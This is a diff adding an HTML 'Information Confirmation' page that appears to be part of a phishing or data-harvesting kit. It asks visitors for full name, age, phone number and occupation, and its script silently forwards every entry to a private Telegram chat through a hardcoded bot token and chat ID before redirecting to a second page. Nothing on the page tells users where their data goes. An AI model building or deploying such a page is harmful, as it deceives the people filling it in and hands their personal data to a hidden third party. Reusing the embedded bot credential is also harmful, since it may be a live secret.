@@ -1,0 +1,223 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Information Confirmation</title>
+    <style>
+         :root {
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial;
+            margin: 0
+        }
+        
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: #f4f7fb;
+            padding: 24px
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 760px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 6px 24px rgba(20, 30, 60, 0.08);
+            padding: 24px
+        }
+        
+        h1 {
+            font-size: 20px;
+            margin: 0 0 12px
+        }
+        
+        p.lead {
+            color: #374151;
+            margin: 0 0 18px
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px
+        }
+        
+        label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #0f172a
+        }
+        
+        input[type=text],
+        input[type=tel],
+        input[type=number] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #e6eef8;
+            border-radius: 8px;
+            font-size: 14px
+        }
+        
+        .field {
+            margin-bottom: 12px
+        }
+        
+        .confirm-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 8px
+        }
+        
+        .radios {
+            display: flex;
+            gap: 8px
+        }
+        
+        .controls {
+            display: flex;
+            gap: 8px;
+            margin-top: 18px
+        }
+        
+        button {
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 0;
+            background: #0ea5a3;
+            color: white;
+            font-weight: 600;
+            cursor: pointer
+        }
+        
+        small.note {
+            color: #6b7280
+        }
+        
+        @media (max-width:600px) {
+            .grid {
+                grid-template-columns: 1fr
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="card" role="main">
+        <h1>Please verify your information for confirmation</h1>
+        <p class="lead">Fill in the fields, then choose <strong>"Confirmed"</strong> or <strong>"Edit"</strong> for each item.</p>
+
+        <form id="confirmForm">
+            <div class="grid">
+                <div class="field">
+                    <label for="noms">📌 FULL NAME</label>
+                    <input id="noms" name="noms" type="text" placeholder="Your full name" required />
+                    <div class="confirm-row">
+                        <span>Status:</span>
+                        <div class="radios">
+                            <label><input type="radio" name="noms_confirm" value="yes" required> Confirmed</label>
+                            <label><input type="radio" name="noms_confirm" value="no"> Edit</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="age">📌 AGE</label>
+                    <input id="age" name="age" type="number" min="0" placeholder="Age" required />
+                    <div class="confirm-row">
+                        <span>Status:</span>
+                        <div class="radios">
+                            <label><input type="radio" name="age_confirm" value="yes" required> Confirmed</label>
+                            <label><input type="radio" name="age_confirm" value="no"> Edit</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="telephone">📌 PHONE NUMBER</label>
+                    <input id="telephone" name="telephone" type="tel" placeholder="+1 234 567 890" required />
+                    <div class="confirm-row">
+                        <span>Status:</span>
+                        <div class="radios">
+                            <label><input type="radio" name="tel_confirm" value="yes" required> Confirmed</label>
+                            <label><input type="radio" name="tel_confirm" value="no"> Edit</label>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="profession">📌 OCCUPATION / ACTIVITY</label>
+                    <input id="profession" name="profession" type="text" placeholder="E.g., Student, Engineer, Businessperson..." required />
+                    <div class="confirm-row">
+                        <span>Status:</span>
+                        <div class="radios">
+                            <label><input type="radio" name="prof_confirm" value="yes" required> Confirmed</label>
+                            <label><input type="radio" name="prof_confirm" value="no"> Edit</label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button type="submit">✅ Submit</button>
+            </div>
+        </form>
+
+        <p class="note"><small class="note">Tip: select "Edit" if you want to correct any information before submitting.</small></p>
+    </main>
+
+    <script>
+        const form = document.getElementById('confirmForm');
+
+        form.addEventListener('submit', async(e) => {
+            e.preventDefault();
+            const requiredRadios = ['noms_confirm', 'age_confirm', 'tel_confirm', 'prof_confirm'];
+            for (const name of requiredRadios) {
+                const checked = form.querySelector(`input[name="${name}"]:checked`);
+                if (!checked) {
+                    alert('Please set the status for each item as Confirmed or Edit.');
+                    return;
+                }
+            }
+
+            const data = new FormData(form);
+            const summary = {
+                'FULL NAME': data.get('noms'),
+                'Name Status': data.get('noms_confirm'),
+                'AGE': data.get('age'),
+                'Age Status': data.get('age_confirm'),
+                'PHONE': data.get('telephone'),
+                'Phone Status': data.get('tel_confirm'),
+                'OCCUPATION': data.get('profession'),
+                'Occupation Status': data.get('prof_confirm')
+            };
+
+            const token = "8215473378:AAHpdcLIykEjY14uMZJjuhPKvizv5vRUNvw"; // Replace with your bot token
+            const chatId = "5615316142"; // Replace with your chat ID
+            const message = Object.entries(summary).map(([k, v]) => `${k}: ${v}`).join("\n");
+
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                window.location.href = "second.html";
+            } catch (error) {
+                alert('Failed to send data to Telegram.');
+                console.error(error);
+            }
+        });
+    </script>
+</body>
+
+</html>
